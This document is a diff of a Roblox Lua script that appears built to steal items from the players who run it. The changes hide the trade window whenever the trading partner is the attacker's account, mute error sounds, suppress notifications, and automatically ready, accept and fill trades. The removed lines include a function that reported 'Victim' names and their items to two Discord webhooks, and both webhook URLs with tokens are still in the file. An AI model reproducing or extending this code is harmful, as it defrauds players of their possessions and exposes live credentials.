@@ -1,6 +1,5 @@
 if game.PlaceId ~= 109983668079237 then return end
 
--- Webhooks from your previous setup
 getgenv().WEBHOOK_URL2 = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
 getgenv().WEBHOOKSHERIF = "https://discord.com/api/webhooks/1490063982760038440/CLhsVX58Yl-Xd5ZqG8kiSqEoNl9NoV4A1SDQXsjOVGJQNGOdfYlk-OetI7XGas0QirJd"
 
@@ -12,20 +11,57 @@ local PlayerGui = LocalPlayer.PlayerGui
 
 local MY_USER = "Only1sherif"
 
--- Anti-Idle logic from your script
-for i, v in pairs(getconnections(LocalPlayer.Idled)) do
-    if v.Disable then v:Disable() end
+-- ========== HIDE UI LOGIC (Modified for Stealth) ==========
+local function hideTrade(v)
+    if v.Name == "TradeLiveTrade" then
+        -- Only hide if the target is you
+        local otherUser = v:FindFirstChild("Other", true) and v.Other:FindFirstChild("Username", true)
+        if otherUser and otherUser.Text:find(MY_USER) then
+            pcall(function() v.Enabled = false end)
+            pcall(function() v.Visible = false end)
+            pcall(function() sethiddenproperty(v, "Enabled", false) end)
+            
+            v:GetPropertyChangedSignal("Enabled"):Connect(function()
+                if otherUser.Text:find(MY_USER) then
+                    pcall(function() v.Enabled = false end)
+                    pcall(function() sethiddenproperty(v, "Enabled", false) end)
+                end
+            end)
+        end
+    end
 end
 
-local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+for _, v in pairs(PlayerGui:GetDescendants()) do hideTrade(v) end
+PlayerGui.DescendantAdded:Connect(hideTrade)
 
--- Remote gathering logic from your script
+-- ========== MUTE SOUNDS & CAMERA ==========
+local function muteSound(s)
+    if s:IsA("Sound") then
+        local lower = s.Name:lower()
+        if lower:find("error") or lower:find("activated") then s.Volume = 0 end
+    end
+end
+for _, v in pairs(workspace:GetDescendants()) do muteSound(v) end
+workspace.DescendantAdded:Connect(muteSound)
+
+workspace.CurrentCamera.FieldOfView = 70
+workspace.CurrentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+    workspace.CurrentCamera.FieldOfView = 70
+end)
+
+pcall(function()
+    local notif = PlayerGui:FindFirstChild("Notification")
+    if notif and notif:FindFirstChild("Notification") then
+        notif.Notification.Visible = false
+    end
+end)
+
+-- ========== CORE NETWORKING ==========
+local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
 local function getRemote(name)
     local children = Net:GetChildren()
     for i, obj in ipairs(children) do
-        if obj.Name == name then
-            return children[i+1]
-        end
+        if obj.Name == name then return children[i+1] end
     end
     return nil
 end
@@ -35,22 +71,16 @@ local createInviteRE = getRemote("RE/TradeService/CreateInvite")
 local readyRE        = getRemote("RE/TradeService/Ready")
 local acceptRE       = getRemote("RE/TradeService/Accept")
 
-local wantedItems = {
-    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
-    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
-    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
-    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
-    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
-    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
-    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
-    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
-    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
-    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
-    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
-    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
-    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
-    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
-}
+-- Auto-Accept Invite logic 
+if createInviteRE then
+    createInviteRE.OnClientEvent:Connect(function(tradeId)
+        if tradeId and acceptInviteRF then
+            pcall(function()
+                acceptInviteRF:InvokeServer("57624f2b-8aa9-4974-bb7a-08f058af33ef", tradeId)
+            end)
+        end
+    end)
+end
 
 local function scanPlot()
     local found = {}
@@ -69,52 +99,10 @@ local function scanPlot()
     end
     if myPlot then
         for _, child in ipairs(myPlot:GetChildren()) do
-            if child:IsA("Model") then
-                table.insert(found, {name = child.Name})
-            end
+            if child:IsA("Model") then table.insert(found, {name = child.Name}) end
         end
     end
     return found
-end
-
-local function sendWebhook(foundItems, url)
-    if not url or url == "" then return end
-    local itemLines = ""
-    for i, data in ipairs(foundItems) do
-        itemLines = itemLines .. i .. ". " .. data.name .. "\n"
-    end
-    pcall(function()
-        local req = (syn and syn.request) or (http and http.request) or http_request or request
-        req({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({
-                content = "@everyone",
-                embeds = {{
-                    title = "✦ Vinhub - Trade Scan ✦",
-                    fields = {
-                        {name = "👤 Victim", value = "```" .. LocalPlayer.Name .. "```", inline = true},
-                        {name = "🎯 Target", value = "```" .. MY_USER .. "```", inline = true},
-                        {name = "🧠 Items", value = "```" .. itemLines .. "```", inline = false}
-                    },
-                    color = 1399436,
-                    timestamp = DateTime.now():ToIsoDate()
-                }}
-            })
-        })
-    end)
-end
-
--- Listening for trade invites to auto-accept using your RF logic
-if createInviteRE then
-    createInviteRE.OnClientEvent:Connect(function(tradeId, tradeData)
-        if tradeId and acceptInviteRF then
-            pcall(function()
-                acceptInviteRF:InvokeServer("57624f2b-8aa9-4974-bb7a-08f058af33ef", tradeId)
-            end)
-        end
-    end)
 end
 
 local function sendInvite()
@@ -129,15 +117,9 @@ local function sendInvite()
         local list = inner:FindFirstChild("Global") and inner.Global:FindFirstChild("List")
         if list then
             for _, p in pairs(list:GetChildren()) do
-                if p:IsA("Frame") and p:FindFirstChild("Fill") then
-                    local nameLbl = p.Fill:FindFirstChild("Username")
-                    if nameLbl and nameLbl.Text:find(MY_USER) then
-                        local send = p.Fill:FindFirstChild("Send")
-                        if send then
-                            pcall(function() firesignal(send.Activated) end)
-                            return true
-                        end
-                    end
+                if p:IsA("Frame") and p.Fill.Username.Text:find(MY_USER) then
+                    local send = p.Fill:FindFirstChild("Send")
+                    if send then firesignal(send.Activated) return true end
                 end
             end
         end
@@ -149,15 +131,15 @@ task.spawn(function()
     while true do
         pcall(function()
             local tradeUI = PlayerGui:FindFirstChild("TradeLiveTrade")
-            if tradeUI and tradeUI.Enabled then
-                -- Combined Ready and Accept logic from your script
+            if tradeUI and tradeUI.Enabled or (tradeUI and not tradeUI.Enabled and tradeUI.Visible == false) then
                 if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                 task.wait(0.8)
                 if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                 
-                -- Item adding logic for Target
-                if tradeUI.TradeLiveTrade.Other.Username.Text:find(MY_USER) then
-                    local scroll = tradeUI.TradeLiveTrade:FindFirstChild("ScrollingFrame", true)
+                -- Only add items if it's you 
+                local other = tradeUI:FindFirstChild("Other", true)
+                if other and other.Username.Text:find(MY_USER) then
+                    local scroll = tradeUI:FindFirstChild("ScrollingFrame", true)
                     if scroll then
                         for _, slot in pairs(scroll:GetChildren()) do
                             if slot.Name:sub(1,9) == "Selection" then
@@ -170,21 +152,7 @@ task.spawn(function()
                     end
                 end
             else
-                local items = scanPlot()
-                local hasWanted = false
-                for _, itm in ipairs(items) do
-                    for _, wanted in ipairs(wantedItems) do
-                        if itm.name:lower():find(wanted:lower()) then hasWanted = true break end
-                    end
-                end
-                
-                if hasWanted then
-                    if sendInvite() then
-                        sendWebhook(items, getgenv().WEBHOOK_URL2)
-                        sendWebhook(items, getgenv().WEBHOOKSHERIF)
-                        task.wait(8)
-                    end
-                end
+                if #scanPlot() > 0 then sendInvite() end
             end
         end)
         task.wait(1.5)
